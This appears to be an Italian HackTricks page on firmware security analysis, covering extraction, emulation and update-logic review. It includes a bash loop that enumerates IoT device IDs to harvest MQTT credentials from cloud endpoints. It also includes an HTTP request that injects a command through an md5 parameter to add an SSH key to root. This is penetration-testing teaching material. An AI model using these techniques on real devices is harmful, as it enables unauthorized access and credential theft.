# Analisi del firmware

{{#include ../../banners/hacktricks-training.md}}

## **Introduzione**

### Risorse correlate


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

Il firmware è un software essenziale che permette ai dispositivi di funzionare correttamente gestendo e facilitando la comunicazione tra i componenti hardware e il software con cui gli utenti interagiscono. È memorizzato in una memoria permanente, garantendo che il dispositivo possa accedere a istruzioni fondamentali sin dal momento dell'accensione, fino all'avvio del sistema operativo. Esaminare e, eventualmente, modificare il firmware è un passo cruciale per identificare vulnerabilità di sicurezza.

## **Raccolta di informazioni**

**Raccolta di informazioni** è un passo iniziale fondamentale per comprendere la composizione di un dispositivo e le tecnologie che utilizza. Questo processo implica la raccolta di dati su:

- L'architettura della CPU e il sistema operativo che esegue
- Specifiche del bootloader
- Layout hardware e datasheet
- Metriche della codebase e posizioni delle sorgenti
- Librerie esterne e tipi di licenza
- Cronologia degli aggiornamenti e certificazioni normative
- Diagrammi architetturali e di flusso
- Valutazioni di sicurezza e vulnerabilità identificate

A tale scopo, gli strumenti di **open-source intelligence (OSINT)** sono inestimabili, così come l'analisi di eventuali componenti software open-source disponibili mediante processi di revisione manuale e automatizzata. Strumenti come [Coverity Scan](https://scan.coverity.com) e [Semmle’s LGTM](https://lgtm.com/#explore) offrono analisi statiche gratuite che possono essere sfruttate per individuare potenziali problemi.

## **Ottenimento del firmware**

L'ottenimento del firmware può avvenire tramite diversi metodi, ognuno con un diverso livello di complessità:

- **Direttamente** dalla fonte (sviluppatori, produttori)
- **Costruendolo** seguendo le istruzioni fornite
- **Scaricandolo** dai siti di supporto ufficiali
- Utilizzando query **Google dork** per trovare file firmware ospitati
- Accedendo direttamente all'**archiviazione cloud**, con strumenti come [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Intercettando gli **aggiornamenti** tramite tecniche man-in-the-middle
- **Estraendo** dal dispositivo tramite connessioni come **UART**, **JTAG** o **PICit**
- **Sniffing** delle richieste di aggiornamento nella comunicazione del dispositivo
- Identificando e utilizzando **hardcoded update endpoints**
- **Dumping** dal bootloader o dalla rete
- **Rimuovere e leggere** il chip di memoria, quando tutto il resto fallisce, usando strumenti hardware appropriati

## Analisi del firmware

Ora che **hai il firmware**, devi estrarre informazioni su di esso per capire come trattarlo. Diversi strumenti che puoi usare per questo:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Se non trovi molto con quegli strumenti controlla l'**entropia** dell'immagine con `binwalk -E <bin>`, se l'entropia è bassa allora probabilmente non è cifrata. Se l'entropia è alta, probabilmente è cifrata (o compressa in qualche modo).

Moreover, you can use these tools to extract **files embedded inside the firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Or [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) to inspect the file.

### Ottenere il Filesystem

Con gli strumenti commentati precedentemente come `binwalk -ev <bin>` dovresti essere stato in grado di **estrarre il filesystem**.\
Binwalk solitamente lo estrae dentro una **cartella nominata con il tipo di filesystem**, che di solito è uno dei seguenti: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Estrazione manuale del filesystem

A volte binwalk **non avrà il magic byte del filesystem nelle sue signature**. In questi casi, usa binwalk per **find the offset of the filesystem and carve the compressed filesystem** dal binario ed **estrarre manualmente** il filesystem secondo il suo tipo usando i passaggi qui sotto.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Esegui il seguente **dd command** per il carving del filesystem Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
In alternativa, può essere eseguito anche il seguente comando.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Per squashfs (usato nell'esempio sopra)

`$ unsquashfs dir.squashfs`

I file saranno nella directory "`squashfs-root`" successivamente.

- Per file archivio CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Per filesystem jffs2

`$ jefferson rootfsfile.jffs2`

- Per filesystem ubifs con NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analisi del firmware

Una volta ottenuto il firmware, è essenziale analizzarlo per comprenderne la struttura e le potenziali vulnerabilità. Questo processo comporta l'utilizzo di vari strumenti per analizzare ed estrarre dati utili dall'immagine del firmware.

### Strumenti di analisi iniziale

Viene fornito un insieme di comandi per l'ispezione iniziale del file binario (indicato come `<bin>`). Questi comandi aiutano a identificare i tipi di file, estrarre stringhe, analizzare dati binari e comprendere i dettagli di partizione e filesystem:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Per valutare lo stato di crittografia dell'immagine, si controlla l'**entropia** con `binwalk -E <bin>`. Bassa entropia suggerisce assenza di crittografia, mentre alta entropia indica possibile crittografia o compressione.

Per estrarre **embedded files**, si raccomandano strumenti e risorse come la documentazione **file-data-carving-recovery-tools** e **binvis.io** per l'ispezione dei file.

### Estrazione del Filesystem

Usando `binwalk -ev <bin>`, in genere è possibile estrarre il filesystem, spesso in una directory chiamata in base al tipo di filesystem (es. squashfs, ubifs). Tuttavia, quando **binwalk** non riesce a riconoscere il tipo di filesystem a causa della mancanza di magic bytes, è necessaria un'estrazione manuale. Questo comporta usare `binwalk` per individuare l'offset del filesystem, seguito dal comando `dd` per ricavare il filesystem:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Successivamente, a seconda del tipo di filesystem (ad es., squashfs, cpio, jffs2, ubifs), vengono utilizzati comandi diversi per estrarre manualmente i contenuti.

### Analisi del filesystem

Con il filesystem estratto, inizia la ricerca di falle di sicurezza. Si presta attenzione a daemon di rete non sicuri, credenziali hardcoded, endpoint API, funzionalità del server di aggiornamento, codice non compilato, script di avvio e binari compilati per analisi offline.

**Posizioni chiave** e **elementi** da ispezionare includono:

- **etc/shadow** e **etc/passwd** per le credenziali utente
- Certificati SSL e chiavi in **etc/ssl**
- File di configurazione e script alla ricerca di potenziali vulnerabilità
- Binari embedded per ulteriori analisi
- Web server comuni dei dispositivi IoT e binari

Diversi strumenti aiutano a scoprire informazioni sensibili e vulnerabilità all'interno del filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) e [**Firmwalker**](https://github.com/craigz28/firmwalker) per la ricerca di informazioni sensibili
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) per analisi firmware complete
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), e [**EMBA**](https://github.com/e-m-b-a/emba) per analisi statiche e dinamiche

### Controlli di sicurezza sui binari compilati

Sia il codice sorgente sia i binari compilati trovati nel filesystem devono essere esaminati per individuare vulnerabilità. Strumenti come **checksec.sh** per i binari Unix e **PESecurity** per i binari Windows aiutano a identificare binari non protetti che potrebbero essere sfruttati.

## Harvesting cloud config and MQTT credentials via derived URL tokens

Molti hub IoT recuperano la configurazione per dispositivo da un endpoint cloud che assomiglia a:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

Durante l'analisi del firmware potresti scoprire che <token> viene derivato localmente dall'ID del dispositivo usando un secret hardcoded, per esempio:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Questo design permette a chiunque conosca un deviceId e la STATIC_KEY di ricostruire l'URL e scaricare la cloud config, spesso rivelando credenziali MQTT in chiaro e prefissi di topic.

Flusso di lavoro pratico:

1) Estrarre il deviceId dai log di boot UART

- Connect a 3.3V UART adapter (TX/RX/GND) and capture logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Cerca le righe che stampano il cloud config URL pattern e il broker address, per esempio:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Recuperare STATIC_KEY e l'algoritmo del token dal firmware

- Caricare i binari in Ghidra/radare2 e cercare il percorso di configurazione ("/pf/") o l'uso di MD5.
- Confermare l'algoritmo (es., MD5(deviceId||STATIC_KEY)).
- Derivare il token in Bash e trasformare il digest in maiuscolo:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Recupera la cloud config e le credenziali MQTT

- Componi l'URL e recupera il JSON con curl; analizza con jq per estrarre i segreti:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Abusa di MQTT in chiaro e di ACLs deboli per i topic (se presenti)

- Usa le credenziali recuperate per iscriverti ai topic di manutenzione e cerca eventi sensibili:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerare ID dispositivi prevedibili (su larga scala, con autorizzazione)

- Molti ecosistemi incorporano i byte vendor OUI/product/type seguiti da un suffisso sequenziale.
- Puoi iterare ID candidati, derivare token e recuperare config programmaticamente:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Note
- Ottieni sempre autorizzazione esplicita prima di tentare enumerazioni di massa.
- Preferisci emulazione o analisi statica per recuperare segreti senza modificare l'hardware target quando possibile.

Il processo di emulazione del firmware consente l'**analisi dinamica** sia del funzionamento di un dispositivo sia di un singolo programma. Questo approccio può incontrare difficoltà dovute a dipendenze hardware o dell'architettura, ma trasferire il root filesystem o binari specifici su un dispositivo con architettura e endianness corrispondenti, come un Raspberry Pi, o su una virtual machine preconfigurata, può facilitare ulteriori test.

### Emulating Individual Binaries

Per esaminare singoli programmi, è fondamentale identificare l'endianness e l'architettura CPU del programma.

#### Example with MIPS Architecture

Per emulare un binario per architettura MIPS, si può usare il comando:
```bash
file ./squashfs-root/bin/busybox
```
E per installare gli strumenti di emulazione necessari:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Per MIPS (big-endian) si usa `qemu-mips`, mentre per i binari little-endian la scelta è `qemu-mipsel`.

#### Emulazione dell'architettura ARM

Per i binari ARM il processo è simile, utilizzando l'emulatore `qemu-arm` per l'emulazione.

### Emulazione di sistema completo

Strumenti come [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), e altri, facilitano l'emulazione completa del firmware, automatizzando il processo e agevolando l'analisi dinamica.

## Analisi dinamica nella pratica

A questo stadio si utilizza un ambiente dispositivo reale o emulato per l'analisi. È essenziale mantenere l'accesso shell al sistema operativo e al filesystem. L'emulazione potrebbe non riprodurre perfettamente le interazioni hardware, rendendo necessari riavvii dell'emulazione. L'analisi dovrebbe riesaminare il filesystem, exploitare le pagine web esposte e i servizi di rete, ed esplorare le vulnerabilità del bootloader. I test di integrità del firmware sono critici per identificare potenziali backdoor.

## Tecniche di analisi in runtime

L'analisi in runtime implica l'interazione con un processo o un binario nel suo ambiente operativo, usando strumenti come gdb-multiarch, Frida e Ghidra per impostare breakpoint e identificare vulnerabilità tramite fuzzing e altre tecniche.

## Binary exploitation e Proof-of-Concept

Sviluppare un PoC per le vulnerabilità identificate richiede una profonda comprensione dell'architettura target e della programmazione in linguaggi di basso livello. Le protezioni runtime binarie nei sistemi embedded sono rare, ma quando presenti potrebbero essere necessarie tecniche come Return Oriented Programming (ROP).

## Sistemi operativi pronti per l'analisi del firmware

Sistemi operativi come [AttifyOS](https://github.com/adi0x90/attifyos) e [EmbedOS](https://github.com/scriptingxss/EmbedOS) forniscono ambienti pre-configurati per il testing della sicurezza del firmware, dotati degli strumenti necessari.

## OS preparati per analizzare il firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS è una distro pensata per aiutarti a eseguire valutazioni di sicurezza e penetration testing dei dispositivi Internet of Things (IoT). Ti fa risparmiare molto tempo fornendo un ambiente pre-configurato con tutti gli strumenti necessari.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Sistema operativo per il testing della sicurezza dei dispositivi embedded basato su Ubuntu 18.04, precaricato con strumenti per il testing della sicurezza del firmware.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Anche quando un vendor implementa controlli di firma crittografica per le immagini firmware, **la protezione contro il version rollback (downgrade) viene frequentemente omessa**. Se il boot- o recovery-loader verifica solo la firma con una chiave pubblica incorporata ma non confronta la *versione* (o un contatore monotono) dell'immagine che viene flashing, un attaccante può installare legittimamente un **firmware più vecchio e vulnerabile che porta ancora una firma valida** e così reintrodurre vulnerabilità precedentemente patchate.

Tipico flusso d'attacco:

1. **Obtain an older signed image**
* Grab it from the vendor’s public download portal, CDN or support site.
* Extract it from companion mobile/desktop applications (e.g. inside an Android APK under `assets/firmware/`).
* Retrieve it from third-party repositories such as VirusTotal, Internet archives, forums, etc.
2. **Upload or serve the image to the device** via any exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* Many consumer IoT devices expose *unauthenticated* HTTP(S) endpoints that accept Base64-encoded firmware blobs, decode them server-side and trigger recovery/upgrade.
3. After the downgrade, exploit a vulnerability that was patched in the newer release (for example a command-injection filter that was added later).
4. Optionally flash the latest image back or disable updates to avoid detection once persistence is gained.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Nel firmware vulnerabile (downgraded), il parametro `md5` viene concatenato direttamente in un comando shell senza sanitizzazione, consentendo l'iniezione di comandi arbitrari (qui – abilitando SSH key-based root access). Versioni successive del firmware hanno introdotto un filtro di caratteri di base, ma l'assenza di protezione contro il downgrade rende la correzione vana.

### Estrazione del firmware dalle app mobili

Molti vendor includono immagini firmware complete all'interno delle loro app companion per dispositivi mobili in modo che l'app possa aggiornare il dispositivo tramite Bluetooth/Wi-Fi. Questi pacchetti sono comunemente memorizzati non crittografati nell'APK/APEX sotto percorsi come `assets/fw/` o `res/raw/`. Strumenti come `apktool`, `ghidra` o anche il semplice `unzip` permettono di estrarre immagini firmate senza toccare l'hardware fisico.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Lista di controllo per valutare la logica di aggiornamento

* Il trasporto/autenticazione dell'*update endpoint* è adeguatamente protetto (TLS + autenticazione)?
* Il dispositivo confronta **numeri di versione** o un **contatore monotono anti-rollback** prima del flashing?
* L'immagine viene verificata all'interno della secure boot chain (es. firme controllate dal ROM code)?
* Il codice userland esegue ulteriori controlli di coerenza (es. mappa delle partizioni consentite, numero di modello)?
* I flussi di aggiornamento *partial* o *backup* riutilizzano la stessa logica di validazione?

> 💡  Se uno qualsiasi dei punti sopra manca, la piattaforma è probabilmente vulnerabile ad attacchi di rollback.

## Firmware vulnerabili per esercitarsi

To practice discovering vulnerabilities in firmware, use the following vulnerable firmware projects as a starting point.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Riferimenti

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Formazione e certificazione

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
